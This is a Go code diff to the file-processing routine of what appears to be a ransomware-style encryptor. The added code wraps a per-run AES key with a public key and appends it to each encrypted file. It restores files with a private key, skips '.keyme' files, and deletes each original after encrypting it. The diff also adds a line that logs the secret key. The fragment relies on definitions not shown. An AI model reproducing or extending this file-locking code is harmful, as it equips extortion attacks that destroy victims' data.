@@ -3,11 +3,26 @@ package main
 import (
 	"crypto/aes"
 	"crypto/cipher"
+	"log"
 	"strings"
 )
 
 func AES(f File) {
-	block := createBlock(secret)
+
+	if strings.HasSuffix(f.filename, ".keyme") {
+		wg.Done()
+		return
+	}
+
+	if strings.HasSuffix(f.filename, sig) {
+		//decrypting
+		encBytes = f.fileBytes[(len(f.fileBytes) - 32):len(f.fileBytes)] //set the encrypted bytes
+		f.fileBytes = f.fileBytes[0 : len(f.fileBytes)-32]               //shave off the encrypted bytes
+		decryptEncBytes(ReadPrivateKey())                                // sets the secret
+	} else {
+		encryptSecret(ReadPublicKey())
+	}
+	block := createBlock()
 	for i := range f.fileBytes {
 		if i%16 == 0 {
 			if strings.HasSuffix(f.filename, sig) {
@@ -19,12 +34,17 @@ func AES(f File) {
 			}
 		}
 	}
+	if !strings.HasSuffix(f.filename, sig) {
+		//encrypting, need to add the bytes at the end so that we can recover
+		_, _ = f.newFile.Write(encBytes)
+	}
 	f.deleteOldFile()
 	wg.Done()
 }
 
-func createBlock(secret string) cipher.Block {
-	block, err := aes.NewCipher([]byte(secret))
+func createBlock() cipher.Block {
+	log.Println(secret)
+	block, err := aes.NewCipher(secret)
 	CheckErr(err)
 	return block
 }
